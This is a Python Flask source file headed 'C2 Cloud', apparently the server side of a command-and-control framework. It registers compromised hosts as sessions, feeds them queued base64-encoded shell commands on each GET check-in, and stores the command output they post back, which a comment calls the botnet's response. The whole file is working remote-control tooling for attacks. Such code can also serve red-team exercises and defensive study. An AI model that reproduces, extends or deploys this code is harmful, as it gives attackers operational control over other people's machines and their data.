# C2 Cloud
#
# Author: Arun Govindasamy

import json
import base64
from flask import request, redirect, Response, make_response, jsonify, session, render_template
from libs.dbOperations import DBOperations
from libs.redisOperations import RedisOperations
from libs.common import Common
from libs.logger import init_logger

redis_client = RedisOperations()
db_client = DBOperations()
common = Common()
logger_instance = init_logger('C2_Cloud')

def init_client(session_id, host_name, user_name):
    # initialize the client 
    dt = common.current_datetime()
    session_key = "session_details_" + session_id
    session_data = redis_client.get_data(session_key)
    logger_instance.info(f"init_client - session_id: {session_id}, host_name: {host_name}, user_name: {user_name}, session_data: {session_data}")
    if not session_data:
        commands_fifo_list = []
        session_data = {"session_id": session_id, "session_type": "http", "os_type": "unix", "created_at": dt, "host_name": host_name, "port": "0", "status": "Connected", "shell": "$", "user_name": user_name, "commands": commands_fifo_list}
        try:
            # write to redis & db
            redis_client.publish_message(common.redis_channel_session, json.dumps(session_data))
            redis_client.write_session_data(session_key, session_data)
            db_client.write_session_data(session_data)
        except Exception as e:
            logger_instance.info(f"init_client - error updating redis: {e}")
    return f''

def command_control(session_id, req_method):
    # return always success response 
    session_key = "session_details_" + session_id
    payload_key = "payload_details_" + session_id
    # send command
    if req_method == 'GET':
        logger_instance.info('command_control - method: GET')
        # heartbeat event 
        redis_client.write_session_data(f"hc_{session_id}", {"session_id": session_id, "heartbeat": common.current_datetime()})
        session_data = redis_client.get_data(session_key)
        logger_instance.info(f"command_control - session_key: {session_key}, session_data: {session_data}, session_data_type: {type(session_data)}")
        commands = session_data["commands"]
        if commands:
            try:
                command = base64.b64decode(commands[0]['command']).decode("utf-8")
                logger_instance.info(f'command_control - method: GET, command: {command}')
                return f'{command}'
            except Exception as e:
                command = ""
                logger_instance.info(f'command_control - method: GET, command: {command}, error: {e}')
                return f''
        return f''
    elif req_method == 'POST':
        # process the response from botnet 
        logger_instance.info('command_control - method: POST')
        dt = common.current_datetime()
        executed_command = base64.b64encode(request.form.get("c").encode('utf-8')).decode('utf-8')
        response = base64.b64encode(request.form.get("r").encode('utf-8')).decode('utf-8')
        logger_instance.info(f"command_control - method: POST, command: {executed_command}, response: {response}")
        if (executed_command is not None and executed_command != "") and response is not None:
            # write to payload and broadcast 
            payload_data = {"session_id": session_id, "shell": "$", "command": executed_command, "command_date": dt, "response": response, "response_date": dt}
            redis_client.write_payload_data(payload_key, payload_data)
            db_client.write_payload_data(payload_data)
            redis_client.publish_message(common.redis_channel_payload, json.dumps(payload_data))
            # to handle new commands received during processing of the first command 
            update_redis_session_data = redis_client.get_data(session_key)
            new_commands = update_redis_session_data["commands"]
            logger_instance.info(f"command_control - method: POST, new_commands: {new_commands}")
            if new_commands:
                first_command = new_commands[0]["command"]
                if first_command == executed_command:
                    new_commands.pop(0)
                update_redis_session_data["commands"] = new_commands
                logger_instance.info(f"command_control - method: POST, new_commands: {new_commands}, session_key: {session_key}, update_redis_session_data: {update_redis_session_data}")
                redis_client.write_session_data(session_key, update_redis_session_data)
        return f''
    else:
        logger_instance.info(f"command_control - method: POST, message: not supported, session_id : {session_id}")
        return f''

def handle_client(args):
    args = args.split('/') # to handle the leading / 
    args_list = list(filter(lambda x: x != '', args))
    args_len = len(args_list)
    req_method = request.method
    result = ""
    logger_instance.info(f"handle_client - args: {args}, args_list: {args_list}, args_len: {args_len}, req_method: {req_method}")
    if args_len == 1:
        # command_control 
        result = command_control(args_list[0], req_method)
    elif args_len == 2:
        # establish session without user name 
        session_id = args_list[0]
        host_name = args_list[1]
        user_name = "NA"
        result = init_client(session_id, host_name, user_name)
    elif args_len == 3:
        # establish session 
        session_id = args_list[0]
        host_name = args_list[1]
        user_name = args_list[2]
        result = init_client(session_id, host_name, user_name)
    else:
        result = ""
    return result

def allrecords():
    logger_instance.info('allrecords')
    records = DBOperations().allRecords("c2_payload")
    result = {"name": "c2", "values": []}
    for record in records:
        result["values"].append(record)
    return str(result)
